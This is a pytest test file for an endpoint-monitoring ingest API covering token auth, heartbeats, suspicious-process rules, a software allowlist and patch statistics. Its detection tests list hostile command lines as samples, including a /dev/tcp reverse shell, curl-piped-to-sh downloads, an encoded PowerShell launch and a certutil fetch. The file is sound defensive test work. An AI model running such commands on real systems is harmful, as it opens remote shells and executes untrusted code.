"""Ingest API: auth token, heartbeat, process rules, software allowlist, patch numbers."""

from datetime import datetime, timedelta, timezone

import pytest

from app.rules import match_rule
from conftest import AUTH, report


def ts(minutes_ago=0):
    return (datetime.now(timezone.utc) - timedelta(minutes=minutes_ago)).isoformat()


# --- agent token -----------------------------------------------------------

def test_ingest_requires_token(client):
    assert client.post("/api/ingest", json=report()).status_code == 401


def test_ingest_rejects_wrong_token(client):
    res = client.post("/api/ingest", json=report(), headers={"Authorization": "Bearer nope"})
    assert res.status_code == 401


def test_ingest_refuses_when_server_has_no_token(client, monkeypatch):
    monkeypatch.delenv("AGENT_TOKEN")
    assert client.post("/api/ingest", json=report(), headers=AUTH).status_code == 503


def test_ingest_validates_payload(client):
    res = client.post("/api/ingest", json=report(hostname="bad host!"), headers=AUTH)
    assert res.status_code == 422


# --- heartbeat -------------------------------------------------------------

def test_checkin_makes_endpoint_online_then_offline(client, monkeypatch):
    assert client.post("/api/ingest", json=report(), headers=AUTH).json() == {"status": "ok", "flagged": 0}
    assert client.get("/api/summary").json()["online"] == 1
    monkeypatch.setenv("ONLINE_SECONDS", "0")
    s = client.get("/api/summary").json()
    assert (s["online"], s["offline"]) == (0, 1)


def test_second_checkin_updates_not_duplicates(client):
    client.post("/api/ingest", json=report(os="Debian 12"), headers=AUTH)
    client.post("/api/ingest", json=report(os="Debian 13"), headers=AUTH)
    eps = client.get("/api/endpoints").json()
    assert len(eps) == 1 and eps[0]["os"] == "Debian 13"


# --- process rules ---------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "sh -c echo aGk= | base64 -d | sh",
    "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
    "curl http://203.0.113.7/a.sh | sh",
    "wget -O /tmp/a.out http://203.0.113.7/a.out",
    "curl -s http://x/y -o /tmp/y",
    "python3 -c import socket",
    "perl -e print",
    "powershell.exe -enc SQBFAFgA",
    "certutil.exe -urlcache -f http://x/a.exe a.exe",
])
def test_rules_flag_suspicious(cmd):
    assert match_rule(cmd)


@pytest.mark.parametrize("cmd", [
    "uvicorn app.main:app --host 0.0.0.0",
    "python3 /app/collector.py",
    "curl http://backend:8000/api/health",
    "sleep 5",
    "base64 file.txt",
])
def test_rules_ignore_normal(cmd):
    assert match_rule(cmd) is None


def test_ingest_stores_only_suspicious_and_dedupes(client):
    procs = [
        {"time": ts(1), "name": "sh", "command_line": "sh -c echo aGk= | base64 -d | sh"},
        {"time": ts(1), "name": "sleep", "command_line": "sleep 5"},
    ]
    assert client.post("/api/ingest", json=report(processes=procs), headers=AUTH).json()["flagged"] == 1
    assert client.post("/api/ingest", json=report(processes=procs), headers=AUTH).json()["flagged"] == 0
    events = client.get("/api/suspicious-processes").json()
    assert len(events) == 1 and events[0]["hostname"] == "LNX-IT-1"
    assert "base64" in events[0]["reason"].lower()


def test_events_older_than_24h_are_hidden_and_newest_first(client):
    procs = [
        {"time": ts(60 * 30), "name": "perl", "command_line": "perl -e old"},
        {"time": ts(10), "name": "python3", "command_line": "python3 -c older"},
        {"time": ts(1), "name": "perl", "command_line": "perl -e newest"},
    ]
    client.post("/api/ingest", json=report(processes=procs), headers=AUTH)
    cmds = [e["command_line"] for e in client.get("/api/suspicious-processes").json()]
    assert cmds == ["perl -e newest", "python3 -c older"]


# --- software allowlist ----------------------------------------------------

def test_first_checkin_is_baseline_new_package_is_unauthorized(client):
    client.post("/api/ingest", json=report(packages=["bash", "curl"]), headers=AUTH)
    assert client.get("/api/unauthorized-software").json() == []
    client.post("/api/ingest", json=report(packages=["bash", "curl", "netcat-openbsd", "htop"]), headers=AUTH)
    sw = {s["software"]: s for s in client.get("/api/unauthorized-software").json()}
    assert set(sw) == {"netcat-openbsd", "htop"}
    assert sw["netcat-openbsd"]["severity"] == "high" and sw["htop"]["severity"] == "medium"
    assert sw["htop"]["department"] == "IT"


def test_allowlist_env_hides_package(client, monkeypatch):
    client.post("/api/ingest", json=report(packages=["bash"]), headers=AUTH)
    client.post("/api/ingest", json=report(packages=["bash", "htop"]), headers=AUTH)
    monkeypatch.setenv("SOFTWARE_ALLOWLIST", "htop, vim")
    assert client.get("/api/unauthorized-software").json() == []


def test_removed_package_disappears(client):
    client.post("/api/ingest", json=report(packages=["bash"]), headers=AUTH)
    client.post("/api/ingest", json=report(packages=["bash", "nmap"]), headers=AUTH)
    client.post("/api/ingest", json=report(packages=["bash"]), headers=AUTH)
    assert client.get("/api/unauthorized-software").json() == []


# --- patches and AV --------------------------------------------------------

def test_patch_percentages_and_av_tile(client):
    client.post("/api/ingest", json=report("A", pending_critical=2, pending_security=2, pending_optional=1, av_enabled=True), headers=AUTH)
    client.post("/api/ingest", json=report("B"), headers=AUTH)
    p = client.get("/api/patches").json()
    assert (p["critical"], p["security"], p["optional"]) == (50, 50, 50)
    assert p["systems_missing_critical"] == ["A"]
    s = client.get("/api/summary").json()
    assert s["av_coverage_percent"] == 50.0 and s["av_needs_attention"] == ["B"]
